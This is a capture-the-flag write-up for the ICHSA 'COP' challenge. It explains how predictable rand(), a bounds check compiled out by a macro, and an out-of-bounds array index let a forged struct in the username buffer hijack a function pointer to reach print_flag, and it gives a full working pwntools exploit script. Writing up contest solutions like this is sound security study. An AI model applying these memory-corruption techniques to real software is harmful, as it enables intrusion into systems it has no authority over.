# COP [500]

##### Hi COP

I wrote a game that should be impossible to win.

A friend of mine managed to get the flag in a few seconds.

Can you help me find out how?

Connect: `nc cop.ichsa.ctf.today 8011`

challenge author: [Yossef Kuszer](https://twitter.com/YKuszer)

Files: [`COP.zip`](https://ichsa.ctf.today/files/1670d2f68b067aec559c8d75eecc3285/COP.zip)

Original:

```sh
$ tree COP
COP
├── chalenge.c
├── chalenge.h
├── cop.gif
├── description.md
├── Dockerfile
├── DockerInstructions.md
└── flag.txt
```

Updated version:

```sh
$ unzip -l COP.zip
Archive:  COP.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2021-06-01 22:13   COP1/
    15690  2021-05-09 20:29   COP1/chalenge.c
    71732  2021-05-06 10:43   COP1/chalenge.h
  3916371  2021-05-09 20:52   COP1/cop.gif
      190  2021-05-10 09:01   COP1/description.md
      519  2021-05-09 20:25   COP1/Dockerfile
      119  2021-05-10 09:55   COP1/DockerInstructions.md
       21  2021-05-30 12:28   COP1/flag.txt
  1035536  2021-06-01 22:05   COP1/game
---------                     -------
  5040178                     9 files
```

The binary is compiled with `-static`, so there's no need for libc. As for the binary itself:

```python
[*] 'game'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     !
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000) !
```

Source code is provided, so I'll be skipping on the usual decompilation effort.

## Bugs

```c
+===============================================+
|   Wellcome to my Rock-Paper-Scissors's game   |
+-----------------------------------------------+
| Current score:
| NOOB player: 0 Points
| Computer: 0 Points
+-----------------------------------------------+
| Options:
| 1) Display game rules ------------- (0 Points)
| 2) Play next round ---------------- (0 Points)
| 3) Skip N rounds ------------------ (2 Points)
| 4) Enable Ascii-art --------------- (3 Points)
| 5) Change user name --------------- (5 Points)
| 6) Print the flag! ------- (4294967295 Points)
| 7) Exit --------------------------- (0 Points)
+-----------------------------------------------+
| Please chose an option [ ]
```

The challenge provided is a simple rock-paper-scissors simulator, limited to `ARRAY_OF_PLAYS_MAX_SIZE == 170` rounds. When the game starts, the program will initialize the 170 moves the computer plans to play using `rand()/srand()`:

```c
    // initializing pseudo-random values and populate array_of_plays
    srand(0);
    for(uint8_t i = 0; i < ARRAY_OF_PLAYS_MAX_SIZE; i++)
    {
        game_ctx->array_of_plays[i].id = i;
        game_ctx->array_of_plays[i].handsign = (rand() % MAX_HANDSIGNS) + MIN_HANDSIGN;
        game_ctx->array_of_plays[i].animation_function = print_ascii;
    }
```

`rand()` is [predictable](https://github.com/Naetw/CTF-pwn-tips#predictable-rngrandom-number-generator), and we can win every round of Rock-Paper-Scissors with 100% accuracy:

```python
from pwn import *
context.binary = 'game'
from ctypes import CDLL
clib = CDLL('libc.so.6')
clib.srand(0)
ARRAY_OF_PLAYS_MAXSIZE = 170
array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)]
current_play = 0

r = remote('cop.ichsa.ctf.today', 8011)
def choose(opt: int):
    r.recvuntil('[ ]\b\b')
    r.sendline(str(opt))
def win_round():
    global current_play
    choose(2)
    r.recvuntil('[ ]\b\b')
    cpu_play = array_of_plays[current_play]
    current_play += 1
    user_play = {0:1, 1:2, 2:0}[cpu_play]+1
    r.sendline(str(user_play))
```

Unfortunately, we'll never obtain the flag by just winning normal rounds, because the option to obtain the flag requires `4294967295 Points`. 

This is where `Skip N Rounds` comes into play. The code for `skip_n_rounds()` seems safe enough:

```c
printf("| You chose to skip %u rounds\n", rounds_to_skip);
// Check for uint8_t integer overflow
if(OVERFLOW_CHECK(rounds_to_skip,ARRAY_OF_PLAYS_MAX_SIZE))
    SET_STATUS_TO_FALSE_AND_BREAK(status)
if(game_ctx->current_play + rounds_to_skip > ARRAY_OF_PLAYS_MAX_SIZE)
    SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, "| Overflow - Not jumping\n")
CHANGE_GAME_CTX_FIELD(current_play, game_ctx->current_play + rounds_to_skip)
```

The last if-statement in there is bugged as a result of `chalenge.h`:

```c
#ifndef DEBUG_MODE
...
#define POINTS_TO_PRINT_FLAG -1u // UINT64_MAX
#define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg)
#else
#define POINTS_TO_PRINT_FLAG 0
#define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) \
{\
    printf(msg);\
    SET_STATUS_TO_FALSE_AND_BREAK(status)\
}
#endif
```

The macro `SET_STATUS_TO_FALSE_PRINT_AND_BREAK()` expands to nothing when `DEBUG_MODE` is off. We know that this is the case because `POINTS_TO_PRINT_FLAG` is `-1u` and not `0`.

Because of this, `game_ctx->current_play` can be increased beyond `ARRAY_OF_PLAYS_MAX_SIZE`. This results in an oob array index in `play_next_round()`:

```c
bool play_next_round()
{ ...
    struct play current_play = {0};
    ...
        current_play = game_ctx->array_of_plays[game_ctx->current_play];
```

That oob array index allows us to generate an arbitrary `struct play current_play`. To grasp why, we need to backtrack and cover a few other details.

First off, `game_ctx->array_of_plays == 0xC0FFEE2000`, and `game_ctx == 0xC0FFEEF000`. This happens because of `mmap()` address hints:

```c
#define GAME_CTX_ID (void *) 0xC0FFEEFAC3
#define ARRAY_OF_PLAYS_ID (void *) 0xC0FFEE2A11
void init_game(){
    // Allocate some memory for the game_ctx
    game_ctx = mmap(GAME_CTX_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    ...
    // Allocate some memory for the game_ctx->array_of_plays
    game_ctx->array_of_plays = mmap(ARRAY_OF_PLAYS_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    ...
}
```

The end result is that `((void*)game_ctx->array_of_plays)+0xd000 == (void*)game_ctx`, meaning that a sufficiently high value of `game_ctx->current_play` in `game_ctx->array_of_plays[game_ctx->current_play];` will pull data from `game_ctx`. In particular, we'll want to index all the way to `game_ctx->player_name[]`.

```c
#define PLAYER_NAME_SIZE 1024
struct game_ctx_t
{
    uint64_t user_points;
    uint64_t pc_points;
    uint32_t current_play : 12;
    uint32_t ascii_art_enabled : 2;
    char player_name[PLAYER_NAME_SIZE];
    struct play * array_of_plays;
};
```

`player_name[]` is user-controllable as a result of `change_user_name()`:

```c
bool change_user_name() {
    ....
    //Get user input
    if(NULL == fgets(game_ctx->player_name, PLAYER_NAME_SIZE, stdin))
        SET_STATUS_TO_FALSE_AND_BREAK(status)
    ....
}
```

Getting an arbitrary `struct play current_play` is now an implementation problem. We'll start by earning 5 points:

```python
for i in range(5): win_round()
```

Then we'll increment `game_ctx->current_play` to an _appropriate_ value, based on `sizeof(struct play) == 24` and `game_ctx->player_name == game_ctx->array_of_plays+0xd018`:

```python
def skip(n: int):
    choose(3)
    r.recvuntil('[  ]\b\b\b')
    r.sendline(str(n))
OFFSET_TO_NAME = 0xd018
SIZEOF_PLAY = 24
while current_play < OFFSET_TO_NAME//SIZEOF_PLAY:
    toskip = min([255, (OFFSET_TO_NAME-current_play*SIZEOF_PLAY)//SIZEOF_PLAY+1])
    current_play += toskip
    skip(toskip)
```

We'll follow that up by inserting the desired fake `struct play` inside `player_name`:

```python
choose(5) # change username
r.recvuntil('new username: ')
fakeplay = p32(1) + b'a'*10 + pack(context.binary.symbols['print_flag']+0x66) + pack(1) # no idea where the b'a'+10 comes from.
'''struct play { //sizeof 24
    uint32_t id = 1;
    void (* animation_function)(enum handsigns, enum handsigns) = print_flag+0x66;
    enum handsigns handsign = 1;
};'''
r.sendline(b'a'*(current_play*SIZEOF_PLAY-OFFSET_TO_NAME)+fakeplay)
```

Over here, the fake `play` structure has `animation_function` set to `print_flag+0x66`. The `+0x66` is there to bypass the `POINTS_TO_PRINT_FLAG` check in `print_flag()`.

With `->current_play` and `->player_name` in check, we only need to call `current_play->animation_function` to win.

```c
        // if ascii art enabled, call function ptr
        if(game_ctx->ascii_art_enabled)
        {
            current_play.animation_function(current_play.handsign, handsig_input);
        }
```

To get to this part of the code, we only need to

```python
choose(4) # enable ascii art
choose(2) # start the next round
r.recvuntil('[ ]\b\b')
r.sendline('1') # pick any option
print(r.recvall()) # get flag
```

```python
[+] Opening connection to cop.ichsa.ctf.today on port 8011: Done
[+] Receiving all data: Done (151B)
[*] Closed connection to cop.ichsa.ctf.today port 8011
b'| Computer chosed: 1\n| You chosed: 1\n| It is a tie\n| Point goes to: no one\n| The flag is:ICHSA_CTF{exploitation_with_cop_is_why_better_than_any_crime}\n'
```

## Full script

```python
from pwn import *
context.binary = 'game'
from ctypes import CDLL
clib = CDLL('libc.so.6')
clib.srand(0)
ARRAY_OF_PLAYS_MAXSIZE = 170
array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)]
current_play = 0

r = remote('cop.ichsa.ctf.today', 8011)
def choose(opt: int):
    r.recvuntil('[ ]\b\b')
    r.sendline(str(opt))
def win_round():
    global current_play
    choose(2)
    r.recvuntil('[ ]\b\b')
    cpu_play = array_of_plays[current_play]
    current_play += 1
    user_play = {0:1, 1:2, 2:0}[cpu_play]+1
    r.sendline(str(user_play))
def skip(n: int):
    choose(3)
    r.recvuntil('[  ]\b\b\b')
    r.sendline(str(n))
for i in range(5): win_round()

OFFSET_TO_NAME = 0xd018
SIZEOF_PLAY = 24
while current_play < OFFSET_TO_NAME//SIZEOF_PLAY:
    toskip = min([255, (OFFSET_TO_NAME-current_play*SIZEOF_PLAY)//SIZEOF_PLAY+1])
    current_play += toskip
    skip(toskip)

choose(5) # change username
r.recvuntil('new username: ')
fakeplay = p32(1) + b'a'*10 + pack(context.binary.symbols['print_flag']+0x66) + pack(1)
r.sendline(b'a'*(current_play*SIZEOF_PLAY-OFFSET_TO_NAME)+fakeplay)
choose(4) # enable ascii art
choose(2) # win
r.recvuntil('[ ]\b\b')
r.sendline('1')
print(r.recvall())
```

